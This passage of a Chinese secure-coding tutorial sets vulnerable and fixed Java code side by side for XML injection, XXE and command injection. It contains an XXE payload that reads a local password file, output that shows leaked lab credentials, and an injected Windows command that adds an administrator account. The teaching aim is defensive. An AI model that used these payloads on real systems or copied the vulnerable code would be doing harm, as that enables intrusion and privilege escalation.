class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\inject\\evil.xml&quot;</span>,<span class="string">&quot;price&quot;</span>);</span><br><span class="line">        System.out.println(evilList.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Map&lt;String,String&gt;&gt; <span class="title function_">ReadXML</span><span class="params">(String uri,String NodeName)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建一个解析XML的工厂对象</span></span><br><span class="line">            SAXParserFactory parserFactory=SAXParserFactory.newInstance();</span><br><span class="line">            <span class="comment">//创建一个解析XML的对象</span></span><br><span class="line">            SAXParser parser=parserFactory.newSAXParser();</span><br><span class="line">            <span class="comment">//创建一个解析助手类</span></span><br><span class="line">            MyHandler myhandler=<span class="keyword">new</span> <span class="title class_">MyHandler</span>(NodeName);</span><br><span class="line">            parser.parse(uri, myhandler);</span><br><span class="line">            <span class="keyword">return</span> myhandler.getList();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常输入结果：[&#123;price=500.0&#125;]</span><br><span class="line">恶意输入结果：[&#123;price=500.0&#125;, &#123;price=5.0&#125;]</span><br></pre></td></tr></table></figure><p>（2）合规代码（利用schema安全检查）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xs:decimal&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;quantity&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xs:integer&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:element</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLFormat</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//测试正常输入</span></span><br><span class="line">        test(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\inject\\normal.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//测试异常输入</span></span><br><span class="line">        test(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\inject\\evil.xml&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String file)</span> &#123;</span><br><span class="line">        <span class="type">SchemaFactory</span> <span class="variable">schemaFactory</span> <span class="operator">=</span> SchemaFactory</span><br><span class="line">                .newInstance(<span class="string">&quot;XMLConstants.W3C_XML_SCHEMA_NS_URI&quot;</span>);</span><br><span class="line">        Schema schema;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            schema = schemaFactory.newSchema(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\inject\\schema.xsd&quot;</span>));</span><br><span class="line">            <span class="type">Validator</span> <span class="variable">validator</span> <span class="operator">=</span> schema.newValidator();</span><br><span class="line">            validator.setErrorHandler(<span class="keyword">new</span> <span class="title class_">ErrorHandler</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">warning</span><span class="params">(SAXParseException exception)</span></span><br><span class="line">                        <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;警告：&quot;</span> + exception);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fatalError</span><span class="params">(SAXParseException exception)</span></span><br><span class="line">                        <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;致命：&quot;</span> + exception);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(SAXParseException exception)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;错误：&quot;</span> + exception);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            validator.validate(<span class="keyword">new</span> <span class="title class_">StreamSource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(file)));</span><br><span class="line">            System.out.println(<span class="string">&quot;解析正常&quot;</span>);;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SAXException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            <span class="comment">//e.printStackTrace();</span></span><br><span class="line">            System.out.println(<span class="string">&quot;解析异常&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            <span class="comment">//e.printStackTrace();</span></span><br><span class="line">            System.out.println(<span class="string">&quot;解析异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常输入........</span><br><span class="line">解析正常</span><br><span class="line">恶意输入........</span><br><span class="line">错误：org.xml.sax.SAXParseException; systemId: file:/D:/JavaWorkspace/TestInput/src/cn/com/budi/xml/inject/evil.xml; lineNumber: 7; columnNumber: 10; cvc-complex-type.2.4.d: 发现了以元素 &#x27;price&#x27; 开头的无效内容。此处不应含有子元素。</span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-1"><a href="#3、防范建议：-1" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>文档类型定义（Document Type Definition，DTD）</li><li>XML结构化定义文件（XML Schemas Definition）</li><li>白名单</li></ul><h1 id="XXE-XML-external-entity"><a href="#XXE-XML-external-entity" class="headerlink" title="XXE (XML external entity)"></a>XXE (XML external entity)</h1><hr><h2 id="1、原理：-1"><a href="#1、原理：-1" class="headerlink" title="1、原理："></a>1、原理：</h2><p>（1）合法输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">lastname</span> <span class="string">&quot;Hello, Budi!&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/test.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span> &gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>&amp;file<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;lastname;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（2）恶意输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/password.txt&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span> &gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">firstname</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;lastname;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-1"><a href="#2、Java代码分析-1" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）不合规代码（未安全检查外部实体）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXEInject</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">receiveXMLStream</span><span class="params">(InputStream inStream, MyDefaultHandler defaultHandler)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取基于SAX的解析器的实例</span></span><br><span class="line">        <span class="type">SAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SAXParserFactory.newInstance();</span><br><span class="line">        <span class="comment">// 2.创建一个SAXParser实例</span></span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">saxParser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        <span class="comment">// 3.解析</span></span><br><span class="line">        saxParser.parse(inStream, defaultHandler);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException, ParserConfigurationException, SAXException, IOException&#123;</span><br><span class="line">        <span class="comment">//正常输入</span></span><br><span class="line">        receiveXMLStream(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\xxe\\inject\\normal.xml&quot;</span>), </span><br><span class="line">                          <span class="keyword">new</span> <span class="title class_">MyDefaultHandler</span>());</span><br><span class="line">        <span class="comment">//恶意输入</span></span><br><span class="line">        receiveXMLStream(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\xxe\\inject\\evil.xml&quot;</span>), </span><br><span class="line">                          <span class="keyword">new</span> <span class="title class_">MyDefaultHandler</span>());</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正常输入，等待解析......</span><br><span class="line">&lt;firstname&gt;XEE TEST !!&lt;/firstname&gt;</span><br><span class="line">==========================</span><br><span class="line">恶意输入，等待解析......</span><br><span class="line">&lt;firstname&gt;OWASP BWA   root/owaspbwa</span><br><span class="line">Metasploitable  msfadmin/msfadmin</span><br><span class="line">Kali Liunx  root/wangpeng</span><br><span class="line">&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><p>（2）合规代码（安全检查外部实体）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomResolver</span> <span class="keyword">implements</span> <span class="title class_">EntityResolver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> InputSource <span class="title function_">resolveEntity</span><span class="params">(String publicId, String systemId)</span> <span class="keyword">throws</span> SAXException, IOException&#123;</span><br><span class="line">        <span class="comment">//System.out.println(&quot;PUBLIC:&quot;+publicId);</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;SYSTEM:&quot;+systemId);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;引用实体检测....&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">entityPath</span> <span class="operator">=</span> <span class="string">&quot;file:///D:/test.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (systemId.equals(entityPath))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;合法解析：&quot;</span>+systemId);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(entityPath);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;非法实体：&quot;</span>+systemId);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXEFormat</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">receiveXMLStream</span><span class="params">(InputStream inStream, MyDefaultHandler defaultHandler)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取基于SAX的解析器的实例</span></span><br><span class="line">        <span class="type">SAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SAXParserFactory.newInstance();</span><br><span class="line">        <span class="comment">// 创建一个SAXParser实例</span></span><br><span class="line">        SAXParser saxParser;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            saxParser = factory.newSAXParser();</span><br><span class="line">            <span class="comment">//创建读取工具</span></span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> saxParser.getXMLReader();</span><br><span class="line">            reader.setEntityResolver(<span class="keyword">new</span> <span class="title class_">CustomResolver</span>());</span><br><span class="line">            reader.setErrorHandler(defaultHandler);</span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(inStream);</span><br><span class="line">            reader.parse(is);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t成功解析完成!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParserConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            System.out.println(<span class="string">&quot;\t非法解析!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SAXException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            System.out.println(<span class="string">&quot;\t非法解析!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            System.out.println(<span class="string">&quot;\t非法解析!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException, SAXException, IOException&#123;</span><br><span class="line">        <span class="comment">//正常输入</span></span><br><span class="line">        System.out.println(<span class="string">&quot;正常输入，等待解析......&quot;</span>);</span><br><span class="line">        receiveXMLStream(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\xxe\\inject\\normal.xml&quot;</span>), </span><br><span class="line">                          <span class="keyword">new</span> <span class="title class_">MyDefaultHandler</span>());</span><br><span class="line">        System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">        <span class="comment">//恶意输入</span></span><br><span class="line">        System.out.println(<span class="string">&quot;恶意输入，等待解析......&quot;</span>);</span><br><span class="line">        receiveXMLStream(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\xml\\xxe\\inject\\evil.xml&quot;</span>),  </span><br><span class="line">                          <span class="keyword">new</span> <span class="title class_">MyDefaultHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">正常输入，等待解析......</span><br><span class="line">引用实体检测....</span><br><span class="line">合法解析：file:///D:/test.txt</span><br><span class="line">    成功解析完成!</span><br><span class="line">==========================</span><br><span class="line">恶意输入，等待解析......</span><br><span class="line">引用实体检测....</span><br><span class="line">非法实体：file:///D:/password.txt</span><br><span class="line">    非法解析!</span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-2"><a href="#3、防范建议：-2" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>白名单</li></ul><h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><hr><h2 id="1、原理：-2"><a href="#1、原理：-2" class="headerlink" title="1、原理："></a>1、原理：</h2><p>（1）正常输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure><p>（2）恶意输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &amp; ipconfig &amp; net user budi budi /add &amp; net localgroup Administrators admin /add</span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-2"><a href="#2、Java代码分析-2" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）非合规Window命令注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderWinFault</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">         <span class="comment">//正常命令</span></span><br><span class="line">        runOrder(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line">         <span class="comment">//恶意命令</span></span><br><span class="line">        runOrder(<span class="string">&quot;dir &amp; ipconfig &amp; net user budi budi /add &amp; net localgroup Administrators admin /add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runOrder</span><span class="params">(String order)</span> <span class="keyword">throws</span> IOException, InterruptedException&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> rt.exec(<span class="string">&quot;cmd.exe /C &quot;</span>+order);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> proc.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(result !=<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;process error: &quot;</span>+ result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (result == <span class="number">0</span>)? proc.getInputStream() : proc.getErrorStream();</span><br><span class="line">        BufferedReader reader=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        StringBuffer  buffer=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            buffer.append(line+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）非合规的Linux注入命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderLinuxFault</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 正常命令</span></span><br><span class="line">        runOrder(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="comment">// 恶意命令</span></span><br><span class="line">        runOrder(<span class="string">&quot; ls &amp; ifconfig&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runOrder</span><span class="params">(String order)</span> <span class="keyword">throws</span> IOException, InterruptedException&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> rt.exec(<span class="keyword">new</span> <span class="title class_">String</span> [] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls &quot;</span>+order&#125;);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> proc.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(result !=<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;process error: &quot;</span>+ result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (result == <span class="number">0</span>)? proc.getInputStream() : proc.getErrorStream();</span><br><span class="line">        BufferedReader reader=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        StringBuffer  buffer=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            buffer.append(line+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）合规编码（对命令安全检查）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderFormat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        runOrder(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line">        runOrder(<span class="string">&quot;dir &amp; ipconfig &amp; net user budi budi /add &amp; net localgroup Administrators admin /add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runOrder</span><span class="params">(String order)</span> <span class="keyword">throws</span> IOException, InterruptedException&#123;</span><br><span class="line">        <span 